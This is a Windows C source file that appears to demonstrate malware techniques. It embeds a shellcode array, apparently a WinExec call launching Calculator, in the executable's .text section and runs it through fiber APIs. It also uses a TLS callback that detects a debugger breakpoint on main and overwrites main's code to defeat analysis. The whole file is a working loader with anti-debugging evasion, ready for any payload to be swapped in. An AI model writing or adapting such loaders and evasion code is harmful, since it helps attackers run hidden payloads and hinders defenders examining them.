#include <Windows.h>
#include <stdio.h>

#pragma comment (linker, "/INCLUDE:_tls_used")
#pragma comment (linker, "/INCLUDE:CheckIfImgOpenedInADebugger")

//----------------------------------------------------------------------------------------------------------------

#define OVERWRITE_SIZE				0x500
#define INT3_INSTRUCTION_OPCODE		0xCC
#define MemSet						__stosb
#define MemCopy						__movsb

//----------------------------------------------------------------------------------------------------------------
#define ERROR_BUF_SIZE				(MAX_PATH * 2)

#define PRINT( STR, ... )                                                                           \
    if (1) {                                                                                        \
        LPSTR cBuffer = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ERROR_BUF_SIZE);       \
        if (cBuffer){                                                                               \
            int iLength = wsprintfA(cBuffer, STR, __VA_ARGS__);                                     \
            WriteConsoleA(GetStdHandle(STD_OUTPUT_HANDLE), cBuffer, iLength, NULL, NULL);           \
            HeapFree(GetProcessHeap(), 0x00, cBuffer);                                              \
        }                                                                                           \
    }  

//----------------------------------------------------------------------------------------------------------------
// TLS Callback Function Prototypes:
VOID ADTlsCallback(PVOID hModule, DWORD dwReason, PVOID pContext);

#pragma const_seg(".CRT$XLB")
EXTERN_C CONST PIMAGE_TLS_CALLBACK CheckIfImgOpenedInADebugger = (PIMAGE_TLS_CALLBACK)ADTlsCallback;
#pragma const_seg()
//----------------------------------------------------------------------------------------------------------------
//----------------------------------------------------------------------------------------------------------------

#pragma section(".text")
__declspec(allocate(".text")) const unsigned char Shellcode[] = {
		0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
		0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
		0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
		0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
		0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
		0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
		0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
		0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
		0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
};


void main() {
    PVOID MainFiber  = NULL;
	PVOID SlaveFiber = NULL;

	PRINT("[#] Executing Main Function: \n");

	PRINT("[i] Executing Shellcode ... ");

	/* convert current thread into a fiber */
	if ( ! ( MainFiber = ConvertThreadToFiber( NULL ) ) ) {
		PRINT( "[!] ConvertThreadToFiber Failed With Error: %d \n", GetLastError() );
		goto END;
	}

	/* create a fiber */
	if ( ! ( SlaveFiber = CreateFiber( 0, ( PVOID ) Shellcode, NULL ) ) ) {
		PRINT( "[!] CreateFiber Failed With Error: %d \n", GetLastError() );
		goto END;
	}

	/* invoke the shellcode */
    SwitchToFiber( SlaveFiber );

END:
	/* convert the fiber back to a normal thread */
	ConvertFiberToThread();

	/* delete created fiber after execution */
	if ( SlaveFiber ) {
		DeleteFiber( SlaveFiber );
		SlaveFiber = NULL;
	}
}

VOID ADTlsCallback( PVOID hModule, DWORD dwReason, PVOID pContext ) {
	DWORD Protect = { 0 };

	if ( dwReason == DLL_PROCESS_ATTACH ) {
		if ( *( BYTE* ) main == INT3_INSTRUCTION_OPCODE ) {
			if ( VirtualProtect( &main, OVERWRITE_SIZE, PAGE_EXECUTE_READWRITE, &Protect ) ) {
				memset( main, 0xFF, OVERWRITE_SIZE );
			}
		}
	}
}